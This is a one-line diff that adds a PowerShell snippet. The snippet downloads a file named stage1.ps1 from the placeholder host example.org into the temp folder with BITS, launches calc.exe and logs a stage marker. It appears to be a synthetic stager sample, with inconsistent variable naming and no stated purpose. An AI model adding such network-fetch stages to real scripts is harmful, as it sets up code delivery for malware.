@@ -1,0 +1,1 @@
+$Stage2Url = 'http://example.org/stage1.ps1'; $OutputPath = "$env:TEMP\stage1.bin"; $RequestTimeout = 83; Start-BitsTransfer -Source $Stage2Url -Destination $OutputPath; Start-Process -FilePath "calc.exe"; Write-Verbose "stage marker 34 reached"
